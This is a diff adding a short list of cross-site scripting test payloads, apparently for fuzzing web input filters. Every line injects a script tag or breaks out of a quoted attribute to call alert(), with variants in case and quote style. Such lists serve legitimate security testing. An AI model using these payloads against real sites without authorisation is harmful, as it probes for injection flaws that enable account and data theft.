@@ -1,0 +1,12 @@
+\"-alert(123456789))//
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert(“XSS”)</script> 
+<script>alert(“XSS”);</script>
+<script>alert(‘XSS’)</script>
+“><script>alert(“XSS”)</script>
+<script>alert(/XSS”)</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
